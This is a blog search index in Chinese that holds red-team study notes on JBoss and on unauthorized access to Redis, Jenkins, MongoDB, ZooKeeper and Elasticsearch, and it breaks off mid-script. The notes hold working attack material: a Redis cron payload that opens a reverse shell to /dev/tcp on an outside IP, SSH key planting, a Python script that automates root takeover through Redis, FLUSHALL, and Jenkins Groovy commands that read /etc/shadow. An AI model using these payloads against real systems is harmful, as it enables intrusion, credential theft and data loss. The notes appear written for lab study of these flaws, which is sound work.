<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>JBOSS未授权访问</title>
      <link href="/2022/04/02/jboss-wei-shou-quan-fang-wen/"/>
      <url>/2022/04/02/jboss-wei-shou-quan-fang-wen/</url>
      
        <content type="html"><![CDATA[<p>文章内容主要摘自某红队系列丛书，将市面上现在流传的 redteam 系列书籍进行一个学习记录。</p><h2 id="0x01-什么是jboss"><a href="#0x01-什么是jboss" class="headerlink" title="0x01 什么是jboss"></a>0x01 什么是jboss</h2><p>Jboss是一个基于J2EE的开放源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p><h2 id="0x02-什么是jboss未授权访问"><a href="#0x02-什么是jboss未授权访问" class="headerlink" title="0x02 什么是jboss未授权访问"></a>0x02 什么是jboss未授权访问</h2><p>未授权访问管理控制台,通过该漏洞,可以后台管理服务,可以通过脚本命令执行系统命令,如反弹shell,wget写webshell文件。</p><h2 id="0x03-漏洞复现（使用CVE-2017-7504的漏洞环境）"><a href="#0x03-漏洞复现（使用CVE-2017-7504的漏洞环境）" class="headerlink" title="0x03 漏洞复现（使用CVE-2017-7504的漏洞环境）"></a>0x03 漏洞复现（使用CVE-2017-7504的漏洞环境）</h2><p>使用vulhub漏洞平台，启用环境位置：vulhub–jboss–cve-2017-7504</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启用成功使用浏览器访问 IP:8080    </p><p><img src="https://imgtp.apqiang.com/2022/04/02/hzoBdxlX.png"></p><p>弱口令进入后台</p><p><img src="https://imgtp.apqiang.com/2022/04/02/nmWwbAd9.png"></p><p>找到入口</p><p><img src="https://imgtp.apqiang.com/2022/04/02/jQemMqLh.png"></p><p>找到 addURL() 接口</p><p><img src="https://imgtp.apqiang.com/2022/04/02/giIQ8LNR.png"></p><p>下载脚本利用 <a href="https://github.com/joaomatosf/jexboss">https://github.com/joaomatosf/jexboss</a></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(kali㉿kali)-[~&#x2F;tools&#x2F;jexboss]└─$ python3 jexboss.py -husage: JexBoss [-h] [--version] [--auto-exploit] [--disable-check-updates] [-mode &#123;standalone,auto-scan,file-scan&#125;] [--app-unserialize]               [--servlet-unserialize] [--jboss] [--jenkins] [--struts2] [--jmxtomcat] [--proxy PROXY] [--proxy-cred LOGIN:PASS]               [--jboss-login LOGIN:PASS] [--timeout TIMEOUT] [--cookies NAME&#x3D;VALUE] [--reverse-host RHOST:RPORT] [--cmd CMD] [--dns URL] [--windows]               [--post-parameter PARAMETER] [--show-payload] [--gadget &#123;commons-collections3.1,commons-collections4.0,jdk7u21,jdk8u20,groovy1,dns&#125;]               [--load-gadget FILENAME] [--force] [-host HOST] [-network NETWORK] [-ports PORTS] [-results FILENAME] [-file FILENAME_HOSTS]               [-out FILENAME_RESULTS]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行脚本指定ip和端口</p><p>python3 jexboss.py -u ip:port</p><p>执行，工具会一次检测一下项目，有漏洞就会显示红色的：VULNERABLE（易受攻击的），工具就会根据找到容易受到攻击的点，进行利用，然后选择yes，开始创建连接</p><p><img src="https://imgtp.apqiang.com/2022/04/02/lJ0hAQCa.png"></p><p>连接后执行命令</p><p><img src="https://imgtp.apqiang.com/2022/04/02/NUB5FnxI.png"></p>]]></content>
      
      
      <categories>
          
          <category> redteam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redteam </tag>
            
            <tag> 外部打点 </tag>
            
            <tag> 未授权 </tag>
            
            <tag> JBOSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>未授权漏洞</title>
      <link href="/2022/03/31/wei-shou-quan-fang-wen-lou-dong/"/>
      <url>/2022/03/31/wei-shou-quan-fang-wen-lou-dong/</url>
      
        <content type="html"><![CDATA[<p>这类问题覆盖的应用、利用方式较广，因此只举例频次较高的漏洞。<br>文章内容主要摘自某红队系列丛书，将市面上现在流传的 redteam 系列书籍进行一个学习记录。</p><h2 id="0x01-Redis"><a href="#0x01-Redis" class="headerlink" title="0x01 Redis"></a>0x01 Redis</h2><p>Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库</p><h3 id="redis-cli"><a href="#redis-cli" class="headerlink" title="redis-cli"></a>redis-cli</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ redis-cli -h <span class="token number">127.0</span>.0.1 -p <span class="token number">6379</span><span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> keys *<span class="token punctuation">(</span>empty array<span class="token punctuation">)</span><span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://imgtp.apqiang.com/2022/03/31/ViB5WSTA.png"></p><h3 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulhub/redis/4-unacc<span class="token punctuation">]</span>└─$ redis-cli -h <span class="token number">127.0</span>.0.1 -p <span class="token number">6379</span> <span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> keys *<span class="token punctuation">(</span>empty array<span class="token punctuation">)</span><span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> CONFIG GET <span class="token function">dir</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"dir"</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"/data"</span>   <span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> CONFIG SET <span class="token function">dir</span> /tmp/   OK   <span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> SET foobar <span class="token string">"who are you? f1ve"</span>   OK   <span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> CONFIG GET dbfilename<span class="token number">3</span><span class="token punctuation">)</span> <span class="token string">"dbfilename"</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token string">"dump.rdb"</span>   <span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> CONFIG SET dbfilename write_file.log   OK   <span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> save   OK   <span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://imgtp.apqiang.com/2022/03/31/EYuIQHos.png"></p><h3 id="反弹shell-Linux"><a href="#反弹shell-Linux" class="headerlink" title="反弹shell-Linux"></a>反弹shell-Linux</h3><p>在redis以root权限运行</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> <span class="token builtin class-name">set</span> x <span class="token string">"<span class="token entity" title="\n">\n</span>* * * * * bash -i >&amp; /dev/tcp/192.168.186.26/4444 0>&amp;1<span class="token entity" title="\n">\n</span>"</span>OK<span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> CONFIG <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/spool/cronOK<span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> CONFIG SET dbfilename rootOK<span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="写入公钥"><a href="#写入公钥" class="headerlink" title="写入公钥"></a>写入公钥</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment">#获取rsa</span>$ ssh-keygen -t rsa<span class="token comment">#将公钥写入foo.txt，注意内容前后要加2个换行</span><span class="token punctuation">(</span>echo -e <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">;</span> <span class="token function">cat</span> /root/.ssh/id_rsa.pub<span class="token punctuation">;</span> <span class="token builtin class-name">echo</span> -e <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span> <span class="token operator">></span> foo.txt<span class="token comment">#将foo.txt放入键crackit里</span><span class="token function">cat</span> foo.txt <span class="token operator">|</span> redis-cli -h IP -x <span class="token builtin class-name">set</span> crackit<span class="token comment">#连接目标</span>redis-cli -h IP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://imgtp.apqiang.com/2022/03/31/to7ybOWZ.png"></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment">#设置目标的redis的配置文件</span><span class="token comment">#设置数据库备份目录为/root/.ssh/</span><span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> CONFIG SET <span class="token function">dir</span> /root/.ssh/OK<span class="token comment">#设置数据库备份文件名为authorized_keys</span><span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> CONFIG <span class="token builtin class-name">set</span> dbfilename <span class="token string">"authorized_keys"</span>OK<span class="token comment">#此时公钥成功写入目标机，文件名为authorized_keys</span><span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> saveOK<span class="token comment">#利用私钥连接目标</span><span class="token function">ssh</span> -i /root/.ssh/id_rsa root@127.0.0.1<span class="token builtin class-name">set</span> x <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>脚本检测：</p><p>可以自动化执行上述写入公钥步骤，并且执行 id 命令</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#coding:utf-8</span><span class="token comment">#redis未授权交互式检测脚本</span><span class="token comment">#commands: python3 redis_shell.py ip</span><span class="token keyword">import</span> redis<span class="token keyword">import</span> sys<span class="token keyword">import</span> paramikorsa_pub <span class="token operator">=</span> <span class="token string">'/home/kali/.ssh/id_rsa.pub'</span><span class="token comment"># 公钥路径</span>pkey <span class="token operator">=</span> <span class="token string">'/home/kali/.ssh/id_rsa'</span><span class="token comment">#密钥路径</span><span class="token comment"># 获取公钥内容</span><span class="token keyword">def</span> <span class="token function">get_id_rsa_pub</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>rsa_pub<span class="token punctuation">,</span> <span class="token string">'rt'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    id_rsa_pub <span class="token operator">=</span> <span class="token string">'\n\n\n&#123;&#125;\n\n'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> id_rsa_pub  <span class="token keyword">def</span> <span class="token function">shell_redis</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">try</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> redis<span class="token punctuation">.</span>Redis<span class="token punctuation">(</span>host<span class="token operator">=</span>ip<span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">6379</span><span class="token punctuation">,</span> socket_timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>config_set<span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">,</span> <span class="token string">'/root/.ssh/'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[ok] : config set dir /root/.ssh/'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>config_set<span class="token punctuation">(</span><span class="token string">'dbfilename'</span><span class="token punctuation">,</span> <span class="token string">'authorized_keys'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[ok] : config set dbfilename "authorized_keys"'</span><span class="token punctuation">)</span>    id_rsa_pub <span class="token operator">=</span> get_id_rsa_pub<span class="token punctuation">(</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'crackit'</span><span class="token punctuation">,</span> id_rsa_pub<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[ok] : set crackit'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[ok] : save'</span><span class="token punctuation">)</span>    key <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>RSAKey<span class="token punctuation">.</span>from_private_key_file<span class="token punctuation">(</span>pkey<span class="token punctuation">)</span>    ssh <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>SSHClient<span class="token punctuation">(</span><span class="token punctuation">)</span>    ssh<span class="token punctuation">.</span>set_missing_host_key_policy<span class="token punctuation">(</span>paramiko<span class="token punctuation">.</span>AutoAddPolicy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    ssh<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">22</span><span class="token punctuation">,</span> username<span class="token operator">=</span><span class="token string">"root"</span><span class="token punctuation">,</span> pkey<span class="token operator">=</span>key<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>    ssh_stdin<span class="token punctuation">,</span> ssh_stdout<span class="token punctuation">,</span> ssh_stderr <span class="token operator">=</span> ssh<span class="token punctuation">.</span>exec_command<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span>    content <span class="token operator">=</span> ssh_stdout<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> content<span class="token punctuation">:</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[ok] connect to &#123;&#125; : &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> content<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>      command <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'&#123;&#125; >>> '</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span>      ssh_stdin<span class="token punctuation">,</span> ssh_stdout<span class="token punctuation">,</span> ssh_stderr <span class="token operator">=</span> ssh<span class="token punctuation">.</span>exec_command<span class="token punctuation">(</span>command<span class="token punctuation">)</span>      contents <span class="token operator">=</span> ssh_stdout<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">for</span> content <span class="token keyword">in</span> contents<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>  <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>    error <span class="token operator">=</span> e<span class="token punctuation">.</span>args    <span class="token keyword">if</span> error <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      error <span class="token operator">=</span> <span class="token string">'save error'</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-] [&#123;&#125;] : &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>error<span class="token punctuation">,</span> ip<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  ip <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>  shell_redis<span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://imgtp.apqiang.com/2022/04/01/UTbAUG0g.png"></p><h3 id="清空数据库"><a href="#清空数据库" class="headerlink" title="清空数据库"></a>清空数据库</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> FLUSHALLOK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>安装配置可参考文章：</p><p><a href="https://www.cnblogs.com/-mo-/p/11487797.html">https://www.cnblogs.com/-mo-/p/11487797.html</a></p><h2 id="0x02-Jenkins"><a href="#0x02-Jenkins" class="headerlink" title="0x02 Jenkins"></a>0x02 Jenkins</h2><p>默认是8080端口 未授权访问就是任意用户都能访问 都能执行命令</p><p>127.0.0.1:8080/jenkins/manage</p><p>127.0.0.1:8080/jenkins/script</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">#命令集合println <span class="token string">"whoami"</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text#<span class="token class-name">Linux</span>println <span class="token string">"ifconfig -a"</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textprintln <span class="token string">"cat /etc/passwd"</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textprintln <span class="token string">"cat /etc/shadow"</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text#<span class="token class-name">Windows</span>println <span class="token string">"ipconfig /all"</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textdef sout <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> serr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span>def proc <span class="token operator">=</span> 'ipconfig'<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span>proc<span class="token punctuation">.</span><span class="token function">consumeProcessOutput</span><span class="token punctuation">(</span>sout<span class="token punctuation">,</span> serr<span class="token punctuation">)</span>proc<span class="token punctuation">.</span><span class="token function">waitForOrKill</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span>println <span class="token string">"out> $sout err>$serr"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="进入后台"><a href="#进入后台" class="headerlink" title="进入后台"></a>进入后台</h3><p><img src="https://imgtp.apqiang.com/2022/04/01/6gYytwSB.png"></p><h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3><p><img src="https://imgtp.apqiang.com/2022/04/01/e6Gv868S.png"></p><p>也可以添加Terminal Plugin插件</p><h2 id="0x03-MongoDB"><a href="#0x03-MongoDB" class="headerlink" title="0x03 MongoDB"></a>0x03 MongoDB</h2><p>默认端口：27017</p><p>脚本检测</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding:utf-8</span><span class="token comment"># mongodb未授权检测脚本</span><span class="token comment"># usage: python3 mongodb_unauth.py ip port</span><span class="token comment"># 默认端口 28017 和 27017</span><span class="token keyword">from</span> pymongo <span class="token keyword">import</span> MongoClient<span class="token keyword">import</span> sysip <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>port <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>conn <span class="token operator">=</span> MongoClient<span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">,</span> socketTimeoutMS<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token comment">#连接MongoDB,延时5秒</span>dbs <span class="token operator">=</span> conn<span class="token punctuation">.</span>database_names<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[ok] -> &#123;&#125;:&#123;&#125; database_names : &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">,</span> dbs<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>error <span class="token operator">=</span> e<span class="token punctuation">.</span>args<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-] -> &#123;&#125;:&#123;&#125; error : &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x04-ZooKeeper"><a href="#0x04-ZooKeeper" class="headerlink" title="0x04 ZooKeeper"></a>0x04 ZooKeeper</h2><p>默认端口：2181 2171</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">ls</span> /<span class="token comment"># 查看所有节点</span>get /<span class="token comment">#获取某个节点信息</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>脚本检测</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding:utf-8</span><span class="token comment"># python3 zookeeper_unauth.py IP 2181</span><span class="token keyword">from</span> kazoo<span class="token punctuation">.</span>client <span class="token keyword">import</span> KazooClient<span class="token keyword">import</span> sys<span class="token comment"># 检测是否存在未授权漏洞</span><span class="token keyword">def</span> <span class="token function">check_zookeeper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">try</span><span class="token punctuation">:</span>zk <span class="token operator">=</span> KazooClient<span class="token punctuation">(</span>hosts<span class="token operator">=</span><span class="token string">'&#123;&#125;:&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>zk<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>childrens <span class="token operator">=</span> zk<span class="token punctuation">.</span>get_children<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>childrens<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[ok] -> &#123;&#125;:&#123;&#125; &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">,</span> childrens<span class="token punctuation">)</span><span class="token punctuation">)</span>zk<span class="token punctuation">.</span>stop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>zk<span class="token punctuation">.</span>stop<span class="token punctuation">(</span><span class="token punctuation">)</span>error <span class="token operator">=</span> e<span class="token punctuation">.</span>args<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-] error: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>ip <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>port <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>check_zookeeper<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x05-Elasticsearch"><a href="#0x05-Elasticsearch" class="headerlink" title="0x05 Elasticsearch"></a>0x05 Elasticsearch</h2><p>默认端口：9200</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;localhost:9200&#x2F;_plugin&#x2F;head&#x2F;web管理界面http:&#x2F;&#x2F;localhost:9200&#x2F;_cat&#x2F;indiceshttp:&#x2F;&#x2F;localhost:9200&#x2F;_river&#x2F;_search查看数据库敏感信息http:&#x2F;&#x2F;localhost:9200&#x2F;_nodes查看节点数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>脚本检测</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding:utf-8</span><span class="token comment"># elasticsearch未授权检测脚本</span><span class="token comment"># usage: python3 elasticsearch_unauth.py ip port</span><span class="token comment"># 默认端口9200</span><span class="token comment"># http://localhost:9200/_plugin/head/ web管理界面</span><span class="token comment"># http://localhost:9200/_cat/indices</span><span class="token comment"># http://localhost:9200/_river/_search 查看数据库敏感信息</span><span class="token comment"># http://localhost:9200/_nodes 查看节点数据</span><span class="token keyword">import</span> sys<span class="token keyword">from</span> elasticsearch <span class="token keyword">import</span> Elasticsearch<span class="token keyword">import</span> requests<span class="token keyword">import</span> jsonip <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>port <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 9200</span><span class="token keyword">try</span><span class="token punctuation">:</span>    es <span class="token operator">=</span> Elasticsearch<span class="token punctuation">(</span><span class="token string">"&#123;&#125;:&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>  <span class="token comment"># 连接Elasticsearch,延时5秒</span>    es<span class="token punctuation">.</span>indices<span class="token punctuation">.</span>create<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token string">'unauth_text'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] 成功连接 ：&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] &#123;&#125; -> 成功创建测试节点unauth_text'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span>    es<span class="token punctuation">.</span>index<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token string">"unauth_text"</span><span class="token punctuation">,</span> doc_type<span class="token operator">=</span><span class="token string">"test-type"</span><span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> body<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"text"</span><span class="token punctuation">:</span> 